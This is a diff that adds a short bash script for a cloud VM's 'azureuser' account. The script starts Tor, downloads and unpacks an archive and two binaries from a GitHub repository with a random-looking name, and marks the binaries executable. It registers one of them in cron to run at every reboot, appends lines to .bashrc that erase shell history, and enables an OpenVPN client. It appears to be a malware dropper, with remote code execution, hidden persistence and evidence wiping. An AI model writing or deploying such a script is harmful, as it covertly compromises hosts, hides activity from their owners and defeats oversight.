@@ -1,0 +1,16 @@
+#!/bin/bash
+cd home/azureuser
+sudo systemctl start tor
+cd home/azureuser
+wget https://github.com/j2d23enr2os32omedaro/jfksdhfvdsiouwrbn32980vxcnbmdfsajkfh2398/raw/main/dolblu_shluh.tar.gz -P /home/azureuser
+tar -xf dolblu_shluh.tar.gz
+rm -r dolblu_shluh.tar.gz
+wget https://github.com/j2d23enr2os32omedaro/jfksdhfvdsiouwrbn32980vxcnbmdfsajkfh2398/raw/main/cpo -P /home/azureuser
+wget https://github.com/j2d23enr2os32omedaro/jfksdhfvdsiouwrbn32980vxcnbmdfsajkfh2398/raw/main/cpo2 -P /home/azureuser
+chmod ugo+x cpo2
+chmod ugo+x cpo
+sudo systemctl enable cron
+sudo crontab -l | { cat; echo "@reboot /home/azureuser/cpo2"; } | crontab
+echo ". cat /dev/null > ~/.bash_history" >> ~/.bashrc
+echo ". history -cw" >> ~/.bashrc
+sudo systemctl enable openvpn@client.service
